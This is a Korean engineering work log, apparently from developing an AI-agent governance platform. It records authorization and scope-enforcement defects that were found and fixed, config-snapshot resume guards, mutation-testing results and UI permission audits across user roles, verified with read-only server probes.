추천되고 실제 신청하면 막힌다 — 그때 사용자는 추천을 신뢰하지 않게 된다.

⬜ **결정 2건을 받아야 착수한다**(설계서 §6): ① 「유사」 중복을 제안에 넣을 것인가(권장 B —
동일/유사를 확신 차이대로 나눠 표시) ② P4-4 를 중복만으로 먼저 낼 것인가(권장 A — 단 진척을
«완료» 로 세지 않는다).

---

### P4-2 — 거버넌스 콘솔에서 **0은 「문제 없음」으로 읽힌다**

이 화면은 정의상 «무엇이 안 되어 있는가» 를 모아 보여 준다. 원천 하나를 못 읽었을 때 0 을
찍으면 **가장 나쁜 방식으로 틀린다** — 사람은 「승인 대기 없음」·「위반 없음」으로 읽고
안심하며, 아무도 「왜 0인가」를 묻지 않는다.

★ 그래서 모든 칸이 `Metric` 이다 — **값과 «읽었는가» 를 함께** 들고 다닌다.
★ 「정책 위반 0」에는 경고를 붙인다: 통제가 지켜진 것일 수도, **통제가 없는 것**일 수도 있다.

**살아 있는 서버 실측(`GET /api/v1/telemetry/orgs`, 관리자 200 / viewer 403):**

```
승인 대기   자산 2건 · 승격 3건            (known=True)
정책 거부   49건 — 조직 범위 불일치 18 · 식별 없음 31
```
★ 봉합한 통제가 **실제로 물고 있다는 증거**다(거부 49건).

### ★★★ 이 집계가 드러낸 더 큰 결함 — 부서 귀속률 **0%**

```
전체 1,133건 중 1,133건에 소속 부서(owner_dept_id)가 없다 → 전부 «(미상)»
```

⚠️ **부서별 대시보드를 만들 데이터가 아예 없다.** P4-2 를 「완료」로 세면 화면에는 «(미상)»
한 줄만 서고, 그것을 본 사람은 「우리 조직은 아직 안 쓰는구나」로 읽는다 — **1,133건이
실제로 돌았는데도.**

`llm_gateway._log_llm_call` 은 `state.owner_dept_id` 를 싣도록 되어 있다(2026-07-28 주석이
그렇게 적어 두었다). 값이 한 번도 채워지지 않은 것이며, 원인은 `ProjectState` 쪽이다.
→ **별건으로 조사한다.** 여기서 급히 채우면 그 값이 맞는지 확인할 수 없다.

### P3 상세 (2026-08-07 · **4/4 완료**)

| # | 항목 | 상태 |
|---|---|---|
| 1 | 독립·Mega 프로젝트가 동일한 Agent Configuration Resolver 사용 | ✅ **실측으로 확인**(이미 충족) |
| 2 | 프로젝트·릴리스에 버전 스냅샷과 정책 결정 ID 저장 | ✅ |
| 3 | 도구 호출 권한 교집합 강제 | ✅ |
| 4 | 권한 회수·템플릿 폐기·버전 변경 중 재개 규칙 | ✅ |

**P3-1 — 이미 충족이었고, 그것을 코드에서 확인했다.**
`sprint/start` · `mega/start_all` · 재개 · 리비전 **네 진입점 모두** `_read_project_template()`
로 템플릿을 정하고 `get_runtime_app()` → `resolve_workflow()` 하나를 지난다.
⚠️ 「이미 됐다」를 주장으로 넘기지 않고 호출부를 세어 확인했다.

**P3-2 — `agent_graph` 가 자기 결함을 주석으로 적어 두고 있었다.**
「조직 자산을 개정하면 이 캐시가 낡는다」·「HOTL 중단점 변경은 서버 재시작 후 반영」.
컴파일된 그래프를 `template_id` 로만 캐시했기 때문인데, 거기서 **두 결함이 함께** 나온다:

1. **개정이 먹지 않는다** — 워크플로우를 고쳐 승인해도 옛 그래프가 돈다. 사용자는 고쳤다고
   믿고 산출물은 옛 구성으로 나오며, 그 차이는 어디에도 남지 않는다.
2. **무엇이 돌았는지 알 수 없다** — 산출물만 보고 되짚을 수 없다.

둘 다 «구성의 신원» 이 없어서 생긴다. → `core/config_snapshot.py` 가 **실행 결과를 바꾸는
필드만**으로 지문을 만든다(표시용 이름은 넣지 않는다 — 오탈자 수정이 재컴파일을 부른다).
지문이 캐시 키가 되어 ①이 사라지고, 가동 시점에 기록해 ②가 사라진다. 릴리스에도 봉인한다 —
프로젝트 기록은 계속 덮이지만 릴리스는 그 시점에 고정돼야 한다.

### P3-4 — 멈춰 있는 동안 세상이 바뀌면 이어가지 않는다

스프린트는 멈춰 있을 수 있다(HOTL 대기·쿼터 동결). 그 사이에 셋이 바뀔 수 있다:

| 바뀐 것 | 그대로 재개하면 |
|---|---|
| 권한 회수 | 자격 없는 사람이 실행을 이어간다 → 권한 표(`route_authority`)가 재개 경로도 덮는다 |
| 템플릿 폐기 | 폐기된 워크플로우가 계속 돈다 → `capture()` 가 실행과 **같은 판정**을 지나 막는다 |
| **버전 변경** | **체크포인트와 다른 그래프로 이어붙는다** |

★★ 세 번째가 가장 위험하고 가장 안 보인다. LangGraph 체크포인트는 **노드 이름**으로 상태를
들고 있어서, 그 노드가 사라졌거나 순서가 바뀌면 실행은 **오류 없이** 단계를 건너뛰거나 엉뚱한
지점으로 간다. 산출물은 나오고 아무도 「무엇이 빠졌는지」 묻지 않는다.

→ P3-2 의 구성 지문이 여기서 쓰인다(`core/resume_guard.py`). 시작 시점과 지금이 다르면
**409** 로 막고 **무엇이 달라졌는지 이름을 댄다.** 「구성이 바뀌었습니다」만 말하면 사용자는
무엇을 되돌려야 할지 몰라 결국 «새로 시작» 을 고르고, 그때까지 쓴 LLM 비용이 버려진다.

★ 403(권한)도 400(잘못된 요청)도 아닌 **409** 다 — 요청은 정당하지만 지금 상태와 맞지 않는다.
403 이면 권한을 요청하러 가고 400 이면 요청을 고치려 한다. 실제로 할 일은 「구성을 되돌리거나
새로 가동」이다.

★ **두 재개 경로가 같은 한 줄을 쓴다.** 한쪽만 걸면 사용자는 막힌 쪽을 피해 열린 쪽으로 간다.

⚠️ **여기만 fail-open 이다.** 시작 시점 스냅샷이 없으면(P3-2 이전 프로젝트) 막지 않는다 —
막으면 진행 중이던 모든 프로젝트가 재개 불가가 된다. 유출 경로가 아니라 **가용성 경로**이므로
열되 `compared=False` 로 그 사실을 남긴다.

**실측(살아 있는 서버, 스프린트를 돌리지 않고 스냅샷만 심어 확인 — 비용 0):**
```
구성 그대로  → 게이트 통과(그 뒤 단계에서 실패)
구성 달라짐  → 409 「빠진 에이전트: Legacy_Reviewer / 워크플로우 버전: v1 → 1」
쿼터 재개    → 409 (같은 판정)
```

### P3-3 — 목록만 막고 실행은 열려 있었다

`POST /api/v1/connectors/{id}/execute` 는 요청자 식별과 `admin.data_access` 만 봤고, **그
커넥터가 요청자 조직의 것인지는 보지 않았다.** 목록(`GET /connectors`)에서는 남의 부서
커넥터가 안 보이므로 «통제되고 있다» 로 보였다 — **목록만 막고 실행을 열어 두면 id 를 아는
사람 앞에서 통제는 없다.** 크로스워크는 같은 문제를 `_gate` 하나로 막았다.

봉합 위치는 라우트가 아니라 `connector_execution.execute()` 다 — **모든 조회의 목**이므로,
실행 경로가 하나 더 생겨도(에이전트 런타임·배치) 같이 걸린다.
`fetch_for_prompt` 도 같은 게이트를 지난다 — 그 결과는 **프롬프트로 들어가고**, 프롬프트
유출은 산출물을 역추적하지 않는 한 아무도 모른다.

### ★★★ 이 작업에서 같은 함정에 두 번 빠졌다 (둘 다 실측으로 드러남)

**① 게이트가 한 번도 물지 않았다.** 처음에는 라우트가 `assert_scope_allowed(p, "")` 의 결과를
범위로 넘겼다. 그 함수는 **빈 요청을 «전사 요청» 으로 보고 빈 문자열을 돌려준다** — 무제한
계정이든 부서 계정이든 똑같이 `''` 였다. 단위 테스트는 초록이었다(범위를 직접 넣어 호출했으니).
살아 있는 서버에서 다른 조직 범위로 호출해도 **같은 응답**이 나와 드러났다.
→ 「파라미터를 주지 않는 것이 가장 넓은 조회」 — 이 저장소가 반복해서 만난 함정이다.
→ 요청된 범위가 아니라 **요청자에게 보이는 범위 집합**(`viewer_scope_nodes`)으로 판정한다.

**② 생문자열을 비교했다.** `viewer_scope_nodes` 는 ECM `node_id`(`node_36c1c7c797e0`)를 주는데
커넥터 소유는 코드(`MNM_BATTERY`)로 저장돼 있다. 그래서 범위가 있는 계정은 **자기 부서
커넥터까지 전부 막혔다** — D-018 이 「정본은 node_id, 코드는 해석해서 써라」로 막으려던 실수다.
→ 비교를 직접 하지 않고 **목록 판정(`filter_visible`)에 맡긴다.** 범위 개수만큼 목록을
부르지만 보통 한두 개이고, **정확한 편이 빠른 것보다 낫다** — 틀린 판정은 유출이거나 실명이다.

⬜ **실행 경로의 교집합을 살아 있는 서버에서 시연하지는 못했다.** 범위가 있으면서
`admin.data_access` 를 가진 계정이 없어, 부서 계정은 권한 표에서 먼저 막힌다(그 자체는 실측
확인). 무제한 계정은 `actor_scopes=None` 이라 필터 대상이 아니다. 논리는 단위 테스트 12건이
덮는다 — **두 축(요청자 범위·선언 문맥)을 각각 확인한다.**

### ★★ 살아 있는 서버에서만 보인 결함 — 기록이 그것을 만든 실행에 지워졌다

스냅샷 모듈도 라우트 배선도 각각 초록이었다. 그런데 실제로 돌리자 프로젝트 폴더에 파일이
없었다. 신규 기획이 기존 산출물을 `.archive/<시각>/` 으로 옮기는데 **`config_snapshot.json`
까지 함께 쓸어 갔다**(`.archive/20260807_104923/config_snapshot.json` 에서 발견).

⚠️ **두 기능이 만나는 지점은 단위 테스트로 보이지 않는다.** 실측 없이 「P3-2 완료」로 세었다면
  기록 기능이 처음부터 아무것도 기록하지 않는 상태였다.

실측(재확인): `resolved=True` · 지문 `1ba041b695c7fb53` · 에이전트 15개 ·
HOTL 중단점 6개(`Requirement_Interviewer`…`Supervisor`) · 이력 1건, 아카이브 후에도 잔존.

### P2 상세 (2026-08-08 · 4/4 완료)

| # | 항목 | 상태 | 담당 |
|---|---|---|---|
| 1 | 전역 컨텍스트 헤더를 공통 API interceptor 에 연결 | ✅ | 나 |
| 2 | Agent Governance Center 범위 탭·권한 상태·승인 흐름 | **✅** | Codex(화면 골격) · 완성·서버·검증은 나 |
| 3 | AI 추천 입력에 조직 프로필·허용 데이터·도구 주입 | ✅ | 나 |
| 4 | 관리자·manager·member·viewer·익명 화면 실측 | **✅** | 나(2026-08-08 전 화면 × 4역할) |

**P2 2/4 → 3/4.** §8.3 상단 문맥 · §8.4 자산 탭과 카드(사용 중인 프로젝트 수 포함) ·
§8.5 생성 마법사 8단계 · §8.6 버튼 계약이 모두 섰고, 역할 5종으로 화면을 실제로 눌러 확인했다.

⚠️ **P2-4 는 ◐ 그대로다.** 이번에 감사한 것은 **이 화면 하나**이고, 설계 §12 가 Antigravity 에
배정한 것은 **전 화면 래스터 감사**다. 한 화면을 봤다고 전체를 세면 표가 거짓이 된다.

### P2-2 — 서버가 막아 주는 것과 사람이 쓸 수 있는 것은 다르다 (2026-08-08)

조직별 자산 저장소·승인 API 는 2026-08-04 부터 완비돼 있었는데 **프론트 소비자가 0건**이었다.
「조직이 자기 에이전트를 만들고 승인해서 쓴다」는 계약이 API 로만 존재했다.

**★ 런처에서는 메뉴가 열리지 않았다.** `App.tsx` 의 모달 목록은 두 벌이고 그 위험을 경고하는
주석까지 있는데 프로젝트 화면에만 추가돼 있었다. 조직 자산은 프로젝트가 없어도 다루는 것이라
— 오히려 「만들기 전에 무엇을 쓸 수 있는가」를 런처에서 본다 — 메뉴는 활성인데 눌러도 아무 일이
없었다. 그때 사용자는 권한 문제로 읽지 않고 **화면 고장으로 읽는다.**

**서버 — 「보이는 것이 전부인가」에 답한다.** `scoped` 는 «걸렀다» 만 말하고 «얼마나» 를 말하지
않아, 사용자는 3건을 보면서 그것이 30건 중 3건인지 알 수 없었다. 목록에 `hidden_present`·
`hidden_count` 를 싣되 판정은 `api.deps.hidden_envelope` 이 이미 가진 계약을 쓴다 —
**존재는 누구에게나, 정확한 건수는 자료를 관리할 사람에게만.**

★★★ **자격 실측이 이 기능의 사활을 갈랐다.** `exact_for="agent"` 에 `is_ai_admin` 을 넣지
않았다면 정확한 건수를 받는 사람은 플랫폼 관리자뿐인데, **플랫폼 관리자는 `scoped=False` 라
애초에 가려지는 것이 없다** — 즉 아무에게도 도달하지 않는 값을 만들고도 테스트는 초록이었을
것이다. 실측(시드 5계정)에서 `hikwon_4` 만이 «걸러지면서 셀 수 있는» 유일한 계정이었다.

```
계정          scoped   agent 규칙   ← 이 표가 없었으면 자격을 지어냈다
관리자         False    (봉투 없음)
AI관리자       True     True        ← is_ai_admin 만 True. can_edit_org·can_manage_standard 는 False
manager/member/viewer  True  False
```

### ★★ 변이 검사 6건 — 전부 잡혔다

「테스트가 통과한다」와 「테스트가 무언가를 지킨다」는 다르다(P4-4·완료기준⑤ 에서 두 번 데었다).
결함을 심어 각각 잡히는지 확인했다: ⓐ AI 관리자를 규칙에서 뺀다 ⓑ 분모에서 `status` 필터를
뺀다 ⓒ 분모만 파일 자산을 포함한다 ⓓ 판정을 버리고 «항상 가려짐» 으로 적는다 ⓔ 봉투를 아예
안 붙인다 ⓕ 분모에서 요청자 신원을 뺀다 → **6/6 잡힘.**

★ ⓕ 는 테스트를 쓰는 도중에 «잡을 수 없다» 는 것을 발견해 검사를 하나 더 만든 것이다. 요청자
신원을 빼면 **내 개인 초안이 분모에서만 빠져 가려진 수가 조용히 줄어든다** — 목록은 계속 맞게
보이므로 목록 내용만 보는 테스트로는 절대 안 잡힌다. 틀린 숫자는 숫자가 없는 것보다 나쁘다.

### 살아 있는 서버 실측 (`backend-verify-2` 8082 · **읽기만**)

```
/agents 파라미터 없음      보임  scoped   가려짐
  관리자                   17   False   «키없음»   ← 전량이므로 봉투를 안 붙인다
  AI관리자                 17   True    False
  manager/member/viewer  17/19/17 True  False
  익명                    401                     ← 목록 자체가 막힌다
```
현재 개발 DB 에 실제로 가려진 조직 자산이 없어(`include_files=false` 로 DB 자산 2건) 가려진
상태는 재현되지 않았다. **운영 DB 에 쓰기 탐침을 넣지 않는다** — 그 상태는 격리 DB 테스트가 덮는다.

### 완성과 감사 (2026-08-08 오후) — 화면을 눌러 보니 **네 가지가 더 나왔다**

★★★ **이 화면은 백엔드에 붙어도 항상 빈 목록이었다.** `agent-governance` 라우터는 `{data:…}`
봉투를 쓰지 않는데 클라이언트가 `closedLoopFetch`(`.data` 를 꺼낸다)를 썼다 — 언제나
`undefined` 가 흘러 **오류 없이 빈 화면**이 됐다. 조회 실패는 눈에 띄지만 «조용히 비어 있음» 은
아무 신호도 남기지 않는다. 오전 실측 때 CORS 에 막혀 이 경로가 **한 번도 성공한 적이 없어서**
드러나지 않았다.

★★ **「우리 조직」 탭이 영원히 비어 있었다.** 판정이 `visibility === 'ORG'` 였는데 서버 상수는
`SCOPE`(하위까지면 `DESCENDANTS`)다. 없는 낱말이라 아무것도 못 고르고, 오류가 없으니 아무도
원인을 묻지 않는다. 배지도 코드를 그대로 노출하고 있었다.

★★★ **부서원에게 「승인 요청」이 활성으로 보였고 누르면 403 이었다** — 설계 §10 이 금지한
「클릭 후에야 아는 403」이다. 화면이 서버 규칙을 다시 구현하면 둘은 서서히 갈라지므로,
**서버가 자산마다 답하게** 고쳤다(`blocked`: update·submit·approve·retire·promote·copy).
판정을 «사유 계산» 과 «던지기» 로 분해해 규칙은 여전히 한 곳에 있다.
→ 계약 테스트가 **또 하나**를 잡았다: 이미 승인된 자산에 사유가 비어 있는데 서버는 403.
  상태 규칙이 저장소 실행 메서드 안에만 있어 화면은 눌러 봐야 알 수 있었다.

★★ **익명에게 「현재 권한 읽기만」이 표시됐다 — 읽기도 안 되는데.** `/capabilities` 만 200 이고
목록은 401 이었고, 화면은 앞의 성공만 보고 뒤의 실패를 무시했다. 화면이 「할 수 있다」고 적은
것을 서버가 거부하면 그것은 통제가 아니라 거짓말이다.

⬜ **남은 것 / 미확인 (세지 않은 것을 «없다» 로 적지 않는다)**

1. ~~강제 여부를 두 곳에서 다르게 읽는다~~ → **봉합했다(2026-08-08, 아래 별도 절).**
2. **✅ 봉합됨(2026-08-08 저녁) — 아래 «실행 문맥» 절 참조.** 자산이 문맥의 tenant·mode 를
   기록하고 목록·분모가 같은 축으로 걸러진다. ⚠️ 다만 테넌트는 **문맥 분리이지 통제가 아니다**
   (헤더 값이므로) — 통제로 만들려면 사용자에게 테넌트를 부여해야 하고 그것은 설계 결정이다.
3. ~~「조직 공개」가 복사로 처리된다~~ → **`POST /{kind}/{id}/publish-to-org` 신설(아래).**
4. 전 화면 래스터 감사(P2-4)는 여전히 Antigravity 몫이다.

### 「조직에 공개」 — 복사 우회를 없앴다 (2026-08-08)

`POST /{kind}/{id}/publish-to-org` 를 만들어 개인 초안을 조직 자산으로 **옮긴다**(복사가
아니다). 종전에는 서버에 경로가 없어 화면이 복사로 우회했고 **원본 개인 초안이 그대로
남았다** — 같은 정의가 두 벌이 되면 어느 쪽이 정본인지 아무도 모르고 한쪽만 고쳐진 채
승인된다. 자격은 **생성과 같다**(다르면 같은 결과를 두 경로로 얻고, 느슨한 쪽이 실제 통제가
된다). 승인돼 있던 개인 자산은 `REVIEW` 로 되돌린다 — 개인 자산의 «승인» 은 자기가 자기 것을
승인한 것이고, 조직 범위에서는 조직이 다시 답해야 한다(`promote` 와 같은 사상).

**★★ 변이 검사가 «주석도 테스트도 없던 방어선»을 찾았다.** 「남의 초안은 옮길 수 없다」 검사를
지우는 변이가 **통과해 버렸다** — 개인 초안은 작성자에게만 보여 그 전에 404 가 나므로
**오늘은 도달할 수 없는 코드**였기 때문이다. 도달 불가능한 방어선은 다음 정리 때 조용히
사라지고, 사라진 뒤에는 무엇을 막고 있었는지 아무도 모른다 → 가시성을 인위적으로 넓혀
「그때가 오면」을 재현하는 테스트를 넣었다(5/5 잡힘).

### ★★★ 사용 집계가 **실제 데이터로** 검증됐다 (2026-08-08 오후)

착수 시점에는 구성을 기록한 프로젝트가 **0개**여서 「관측이 없을 때」만 확인할 수 있었다.
그 사이 다른 세션이 시드 스크립트(`scripts/seed_comprehensive_test_data.py`)를 돌려 스냅샷이
2건 생겼고, 그것으로 나머지 절반을 실측했다:

```
프로젝트 60개 · 구성 기록 2개 · 스킬축 0개
[agent]    자산 17 · countable=True  · 쓰이는 자산 15   RFP_Analyst → 1개 ['demo-todo-app']
[workflow] 자산  8 · countable=True  · 쓰이는 자산  2   manufacturing-cost-analysis → 1개
[skill]    자산 31 · countable=False · 쓰이는 자산  0   ← 옛 스냅샷에 스킬축이 없다
```

★ 세 가지가 한 번에 확인됐다:
① **매칭 키가 실제로 맞는다** — `file:agent:RFP_Analyst` 가 스냅샷의 `RFP_Analyst` 와 붙었다.
   `asset_usage.skill_key` 가 겪은 «교집합 0» 이 재현되지 않았다.
② 화면이 **「사용 중인 프로젝트 1개」** 를 실제로 그린다(관리자 화면 실측, 콘솔 오류 0).
③ **같은 화면에서 스킬만 「아직 모름(구성을 기록한 프로젝트 0/60)」** 으로 나온다 —
   스킬 31개가 「0개 사용」으로 보고돼 전부 폐기 후보가 될 뻔한 그 함정을 설계대로 피했다.

### ★★★ 강제 스위치가 두 곳에서 다르게 읽히고 있었다 (2026-08-08 · 봉합)

**강제 여부의 정본은 `data/scope_policy.json`** 이고 코드 기본값을 이긴다 — 2026-07-30 에
사용자 지시로 `org_enforce=true` 가 켜져 있다. `api.deps._enforced()` 가 그 계약을 담고 있고,
그 주석은 「판정 함수들이 **모두 여기서** 같은 답을 얻는다」고 못박는다.

그런데 **`current_principal` 한 줄만** `config.ORG_ENFORCE`(=False)를 직접 읽고 있었다.
정책으로 강제를 켠 실서버에서 **거기서는 익명이 통과**했다. 뒤에 `require_caps` 가 있는
라우트는 거기서 막혔지만, **이 401 에만 기대던 라우트는 열려 있었다** — 실측 당시
`current_principal` 을 쓰면서 다른 관문이 없는 라우트가 **5개 파일 34개**였다
(앱 전달 10 · 의사결정 10 · 발간 9 · MCP 4 · 실시간 1).

⚠️⚠️ **단위 테스트가 이것을 구조적으로 못 봤다.** 기존 테스트는 `monkeypatch` 로
`config.ORG_ENFORCE=True` 를 **직접** 켜므로 그 줄이 정상 동작하는 것처럼 보였고 실제로
초록이었다(`test_capabilities_needs_identification` 이 401 을 단언하며 통과). 실서버는 정책
파일로 켜므로 **다른 세계**가 된다. 같은 뜻의 스위치를 두 곳에서 읽으면 테스트는 그 불일치를
볼 수 없다 — 전체 스위트가 통과한 것도 같은 이유다(conftest 가 정책 파일을 격리한다).

→ `tests/test_enforcement_switch.py` 6건은 **코드 기본값을 끈 채 정책만 켠다.** 그 조합이
  실서버의 상태이고, 그것을 재현해야만 이 결함이 보인다.

**★★ 변이 검사가 «주석만 있고 검사가 없던» 계약을 하나 더 찾았다.** `scope.unrestricted`
검사를 지우는 변이가 **통과해 버렸다** — 「조직을 세우기 전에는 강제가 켜져 있어도 통과해야
한다」는 계약(주석에 이유까지 적혀 있다: 그러지 않으면 조직을 만들 화면조차 안 열려 아무도
조직을 세울 수 없다)을 지키는 검사가 없었다. 테스트를 추가하니 4/4 가 잡힌다.

**실측**(정책이 켜진 8082 · 읽기만):

```
경로              익명   관리자  viewer
자산 권한/목록      401    200    200     ← 수정 전 capabilities 는 익명에게 200 이었다
앱 전달 수신/발신    401    200    200
의사결정 대기        401    200    200
발간물 목록         401    200    200
프로젝트 목록        401    200    200
/api/v1/health     200    200    200     ← current_principal 을 쓰지 않는 의도된 공개
```

★ **통제를 고치면서 사용자를 잠그지 않았다** — 관리자·viewer 는 전부 통과한다. 이 확인이 없으면
「막았다」는 사실만으로 개선이라고 말하게 된다.

### 같은 유형 훑기 — **만료일에서 하나 더 나왔다** (2026-08-08)

강제 스위치를 고치고 나서 「같은 뜻을 두 곳에서 읽는 곳」을 세 유형으로 훑었다.

**① 정책이 정본인데 코드 상수를 읽는 곳 → 1건 발견·수정.**
`scope_policy` 가 관리하는 값은 둘이다: `org_enforce`(위에서 봉합)와 **한시 예외 만료일.**
만료일도 관리자가 화면에서 바꾸고 `scoping.policy_deadline()` 이 그것을 읽는데, **두 곳이
코드 상수 `LEGACY_GRANDFATHER_UNTIL`(2026-12-31)을 직접 읽고 있었다**:
· `scope_contract.legacy_pending()` — 이행 목록의 `deadline`·`default_deadline`
· `master_data` 관문 A 안내 문구

⚠️⚠️ 그래서 **만료 «판정» 은 정책을 따르고 «표시» 는 코드 상수를 따랐다.** 관리자가 만료일을
미루면 사람들은 화면의 옛 날짜로 이행 계획을 세우고, **앞당기면 적힌 날짜보다 먼저 데이터가
사라진다.** 「언제까지 봐주는가」를 틀리게 말하는 이행 목록은 이행을 돕는 것이 아니라 방해한다.
★ 덤으로 `deadline` 계산이 「행별 만료일이 전역을 이긴다」는 규칙을 **손으로 다시 쓰고 있었다**
  — `legacy_deadline(row)` 한 곳을 쓰게 했다(`is_expired` 도 같은 함수를 쓴다).

**② 같은 판정을 두 곳에서 각자 구현 → 이미 봉합.** `_enforced()` 가 그 계약을 담고 있고,
어기던 한 줄을 위에서 고쳤다.

**③ 서버 상수를 화면이 따로 적어 둔 곳 → 오늘 고친 것으로 해소.** 화면이 쓰는 대문자 낱말
(`PERSONAL`·`SCOPE`·`DESCENDANTS`·`ENTERPRISE`·`SYSTEM`·`DRAFT`·`REVIEW`·`APPROVED`·
`RETIRED`·`REAL`)을 서버 정본과 대조했고 **불일치 0건**이다(오전에 `ORG`→`SCOPE` 를 고친 결과).

→ `tests/test_enforcement_switch.py` 9건. 마지막 하나는 **`core/` 전체를 훑어 만료일 상수를
  직접 읽는 모듈이 다시 생기는지** 본다 — 행동 테스트만으로는 새 경로가 같은 실수를 반복하는
  것을 막지 못한다(`scoping`·`scope_policy` 는 폴백으로 필요하므로 제외).

### 전 화면 얕게 훑기 (2026-08-08) — **새 결함 0건**

Agent Governance 한 화면에서 나온 결함들을 **검사 규칙으로 바꿔** 전체에 돌렸다. 화면을 하나씩
손으로 여는 것은 «얕게» 가 아니므로, 자동 검사로 후보를 좁히고 걸린 것만 열어 봤다.

**① 봉투 불일치 — `/openapi.json` 으로 파라미터 없는 GET 95개 전수.**
`.data` 를 꺼내는 클라이언트가 봉투 없는 라우터를 부르면 **오류 없이 빈 화면**이 된다.
결과: 봉투 없는 응답 2개 — `agent-governance/capabilities`(오늘 고친 클라이언트가 양쪽을
받는다)와 `/api/v1/health`(의도된 공개, 봉투 불필요). **다른 11개 클라이언트는 전부 정상.**

**② 익명 노출 — 같은 95개를 익명으로도 찔렀다.** 200 이 나온 것은 `/api/v1/health` **하나**다.
★ 아침에는 `capabilities` 가 익명에게 열려 있었고 34개 라우트가 그 401 에만 기대고 있었다 —
  강제 스위치 봉합의 효과가 **전수로** 확인됐다.

**③ 조회 실패를 «0건» 으로 그리는가 — 위반 0.** 허브 화면 18개 중 `DataState` 를 안 쓰는 것은
생성 마법사 하나인데, 그 화면은 목록을 조회하지 않는다(생성만 한다).

**④ 사유 없는 비활성 버튼 — 위반 0.**

⚠️⚠️ **여기서 내 스캐너가 오늘 하루 다룬 실수를 그대로 저질렀다.** 처음에는 8개 화면이
위반으로 잡혔는데, `🔒` 문자만 «사유» 로 셌기 때문이다. `AgentMasterPanel` 을 열어 보니 배너로
「조회만 가능합니다 — 에이전트 구성을 바꿀 권한이 없습니다」를 명확히 알리고 있었다.
**측정 기준이 좁으면 결론이 틀린다** — 필드마다 자물쇠를 붙이는 것만이 §8.6 을 지키는 방법이
아니고, 기준은 「사용자에게 이유가 도달하는가」다. 기준을 고치니 남은 2건은 권한이 아니라
**입력 전**(`!selectedType`)과 **슬라이드 첫/끝**(`currentSlide === 0`)이었다.

### P2-4 깊은 감사 — 화면 13개 × 역할, **얕은 훑기가 못 본 결함 1건** (2026-08-08)

메뉴의 전 화면을 관리자·viewer 로 **실제로 열어** §10 UI 4항을 대조했다(자동 순회).

```
관리자  13/13 열림 · 콘솔 오류 0
viewer  11/13 열림 + 2개는 **누르기 전에 잠김**(데이터 거버넌스·LLM 텔레메트리)
        업무표준·조직권한·에이전트통제소·Agent Governance·AI스킬 → 권한 사유 표시 O
        콘솔 오류 0
```
★ 「403 을 클릭 후 처음 알게 되는 경로가 없어야 한다」는 지켜지고 있었다(오전에 넣은
  `NavItem.disabledReason` 이 두 화면을 누르기 전에 막는다).

**★★★ 그런데 「경영계획」에서 얕은 훑기가 못 본 결함이 나왔다.**

viewer 로 열면 「**조회 불가 — 목록을 가져오지 못했습니다**」 + 「다시 시도」 버튼이 뜬다.
실측하니 `/planning/scenarios?org_id=MNM_BATTERY` 가 **viewer 에게 404, 관리자에게 200** 이다.
라우트는 멀쩡하다 — 이 서버는 **범위 밖 요청을 404 로 은폐**한다(설계 §7.1. 403 은 «그런
자원이 있다» 를 알려 주므로). 즉 「당신 범위가 아닙니다」인데 화면은 **서버 고장**으로 그렸고,
사용자는 영원히 같은 결과가 나오는 「다시 시도」를 누른다.

⚠️ **체계적 불일치였다**: 서버는 8개 라우터에서 404 은폐를 쓰는데, `asLoaded` 를 **복사해 가진
화면 5개**가 전부 401/403 만 «권한» 으로 보고 404 는 «조회 실패» 로 떨어뜨렸다.
→ 그 복사본 5개는 `DataState.failed()` 와 **완전히 같은 로직의 중복**이었다. 중복을 지우고
  `failed()` 한 곳에 404 를 넣었다 — 오늘 내내 다룬 「같은 판정을 두 곳에서」의 화면 판이다.

실측(수정 후, viewer): 「**접근 불가** — 이 목록을 볼 권한이 없습니다. 비어 있는 것이 아니라
**보이지 않는 것**입니다.」 무의미한 재시도 버튼도 사라졌다.

### 행동 단위 대조 — viewer 에게 **활성인 쓰기 버튼**을 세었다 (2026-08-08)

「열리는가」 다음 질문은 **「누를 수 있게 보이는 것을 실제로 누를 수 있는가」** 다. 버튼을
실제로 누르면 운영 DB 에 쓰기가 생기므로(★★ 쓰기 탐침 금지), **활성 상태만 수집**하고 서버
판정은 코드로 대조했다.

⚠️ 첫 수집은 오탐 투성이였다 — 탭·레일·목록 항목이 `<button>` 으로 렌더돼 「등록」·「승인 대기」
같은 낱말에 걸렸다(라벨+힌트가 붙어 텍스트가 길다). **짧은 라벨(≤14자) + 레일/탭 제외**로
좁히니 그림이 분명해졌다:

```
viewer 에게 활성인 쓰기 버튼 — 13화면 중 단 1개
  지식 허브        「지식팩 만들기」 비활성 O
  기준정보          「유형 만들기」  비활성 O
  Agent Governance 5개 전부 비활성 O
  크로스워크        「+ 시스템 등록」 **활성** ← 유일한 후보
```

**★★★ 그 하나가 진짜였다.** `CrosswalkPanel` 의 「+ 시스템 등록」은 `disabled={busy !== null}`
뿐이라 viewer 에게 **항상 활성**이고, 서버는 `_assert_may_write`(=`ADMIN_DATA_ACCESS`)로 막는다
→ 누르면 403. 설계 §10 이 금지한 「클릭 후에야 알게 되는 403」이다.

원인: **트랙 G 가 서버를 봉합할 때 화면을 함께 고치지 않았다.** 그 화면은 권한을 읽는 코드가
아예 없었고(`grep` 0건), 서버에도 «쓸 수 있는가» 를 알려 주는 경로가 없었다.

→ Agent Governance 와 같은 방식으로 고쳤다: `write_block_reason(p)` 를 분리해 `GET /systems`
  응답에 실었고, 화면은 그 문장을 그대로 버튼에 붙인다. **화면이 판정을 복제하지 않는다.**
  ⚠️ `require_caps` 를 부르지 않는다 — 그 함수는 거부를 감사에 남기므로 목록을 열 때마다
  «거부» 가 쌓인다(실제 시도가 아닌데도).

실측: viewer → 버튼 비활성 + 「🔒 권한이 없습니다: ['admin.data_access'] — 관리자 센터의 해당
탭 권한이 필요합니다」 · 관리자 → 활성, 자물쇠 없음(**과잉 차단 아님**).

### 부분 권한 축 + §10 마지막 항목 — **P2-4 완료** (2026-08-08)

**manager·member 로 전 화면을 다시 훑었다. 어긋남 0건.** 세 역할을 나란히 놓으면 경계가 정확히
갈린다 — 이것이 §10 이 요구한 「버튼·설명·목록이 서버 권한과 일치한다」이다.

```
                        viewer   member   manager
+ 시스템 등록             비활성    비활성    비활성   ← 직전 커밋에서 고친 것
Agent Gov 새로 만들기     비활성    활성      활성
Agent Gov 승인 요청       비활성    비활성    활성     ← 부분 권한이 갈리는 지점
Agent Gov 전사 승격 요청  비활성    비활성    비활성
Agent Gov 사용 중단       비활성    비활성    활성
```
조직·권한/에이전트 통제소/업무표준은 편집 UI 를 비활성으로 두고 **배너로 이유를 말한다**
(「조직 편집 권한이 없어 조회만 가능합니다 — 변경은 관리자에게 요청하십시오」).

